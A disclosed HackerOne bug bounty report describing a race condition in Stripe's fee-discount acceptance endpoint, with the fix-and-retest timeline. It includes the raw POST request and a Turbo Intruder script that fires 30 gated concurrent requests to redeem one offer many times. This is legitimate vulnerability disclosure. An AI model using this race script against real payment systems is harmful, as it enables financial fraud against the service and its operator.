---
title: "Fee discounts can be redeemed many times, resulting in unlimited fee-free transactions"
author: ian
url: https://hackerone.com/reports/1849626
date_published: 2023-01-28
date_scraped: 2026-11-17
platform: hackerone
disclosed_report: https://hackerone.com/reports/1849626
bounty: $5,000 (plus two $50 retest awards)
vuln_class: business-logic
---

<!-- Raw scraped text below. Public, non-paywalled content only. -->

#1849626 Fee discounts can be redeemed many times, resulting in unlimited fee-free transactions (Stripe)

Status: Resolved. Severity: Medium (6.5). Weakness: Business Logic Errors. Bounty: $5,000. Reported Jan 28, 2023 03:16 UTC. Disclosed Feb 25, 2023. Note: screenshots in the original were hidden by the program (shown as blacked-out blocks).

## Summary:

Hi there, first off, I am an actual Stripe customer using Stripe for my real business, so I used my actual Stripe account to test this (as there is no other way). I realize this is not ideal but hope you understand given the unique scenario!

I was recently offered a fee discount of $20,000 on Stripe transactions. Stripe Support applied the offer to my account, and I was shown a prompt to accept the fee discount in my dashboard.

I decided I should try and look for a race condition in this acceptance. So, I used Burp Turbo Intruder to race the request that accepts the fee discount, `/ajax/accept_fee_discount_offer` (forgot to take screenshot as I did not think it would work!).

It seems a race was not even needed though, as I called it 30 times and 30 fee discounts were immediately applied to my account! As a result, I now have $600,000 of fee-free processing applied to my account. Obviously, this is not ideal for Stripe as you only intended to offer me $20,000! I believe you could keep calling this endpoint if you wanted to, you just need a valid `fdo_` ID.

[screenshot hidden]

## Impact

Unlimited fee-free discounts. This will cost Stripe about 3% of each discount, so $600 each time a $20k discount is abused.

## Comments / timeline

**ian (Jan 28, 2023 03:17 UTC):** My Stripe account ID is `acct_1MBXAQDk3bp1ZWoG`. Please don't ban me! :)

**ian (updated Feb 25, 2023):** Also, here are all of the applied fee discounts shown in the discounts API. [screenshot hidden]

**h1_analyst_oliver (Jan 28, 2023 09:43 UTC):** Standard triage acknowledgement. Status changed to Pending program review at 09:46 UTC.

**grazingllama (Stripe, Feb 3, 2023):** Changed status to Triaged. "Thank you for your report! We're having our engineering team take a look and hope to have an update for you soon!"

**snoringllama (Stripe, Feb 13, 2023):** Status changed to Retesting. Reporter invited to perform a retest for $50. "We believe we have fixed the vulnerability as described. Could you please verify that it is resolved?"

**ian (Feb 13, 2023 18:02 UTC):** I can confirm that the excess fee discounts were removed from my account. However, I didn't save the fee discount offer (fdo_) ID that this endpoint requires. Do you have this ID for my account that I can test with, or should I complete the retest without this?

**snoringllama (Feb 13, 2023 20:08 UTC):** We have invalidated the previous discount offer so that won't/shouldn't work anymore. We have generated a new discount code for you to test with: `[REDACTED]`.

**ian, retest 1 result (Feb 13, 2023):** Reproduce? **Yes, the issue still exists.**
Summary: it seems like you did add a check here, however there is still a race condition. Using Turbo Intruder I was still able to redeem it 23 times out of 30 attempts. The 7 attempts that failed were correctly blocked:

```
{"error":{"message":"This discount offer has already been accepted","param":"id"}}
```

But 23 times it successfully applied to my account. [screenshot hidden]

Request made with Turbo Intruder (cookies and CSRF token redacted by original author):

```
POST /ajax/accept_fee_discount_offer?include_only%5B%5D=token HTTP/1.1
Host: dashboard.stripe.com
Cookie: [REDACTED]
Content-Length: 31
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
X-Stripe-Csrf-Token: [REDACTED]
Stripe-Account: [REDACTED]
Stripe-Livemode: true
Origin: https://dashboard.stripe.com
Referer: https://dashboard.stripe.com/dashboard
X-1: %s

id=[REDACTED fdo_ id]
```
(Other browser headers omitted: Sec-Ch-Ua*, User-Agent, Accept*, Stripe-Version 2022-08-01.)

Turbo Intruder script:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=1,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')
    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

Stripe awarded $50 for completing the retest (Feb 13, 2023). Status reverted to Triaged.

**snoringllama (Feb 15, 2023):** Status Retesting again, $50 retest. "We've added some additional mitigations that should effectively prevent this issue going forward." New test code provided: [REDACTED].

**ian, retest 2 result (Feb 16, 2023):** Reproduce? **No, the fix works.** "Nice! I can confirm it can no longer be raced." Stripe awarded another $50.

**snoringllama (Feb 16, 2023 00:05 UTC):** Closed the report as Resolved. "We're going to review your report and get back to you soon on bounty information!"

**ian (Feb 16, 2023):** Requested disclosure. "Would love to disclose when possible. Please just redact my Burp screenshots that contain cookies."

**Stripe (Feb 16, 2023 22:26 UTC):** Rewarded ian with a **$5,000** bounty. "We're pleased to inform you that your submission is eligible for our bug bounty program..."

**snoringllama (Feb 25, 2023):** Happy to disclose, but unable to redact specific portions due to platform limitations; either whole report or partial disclosure.

**ian (Feb 25, 2023):** Asked whether HackerOne's tool can convert Burp screenshot attachments to internal-only; if not, limited disclosure with a written summary is best.

Report disclosed Feb 25, 2023 01:27 UTC. Participants: ian, snoringllama, grazingllama, h1_analyst_oliver.
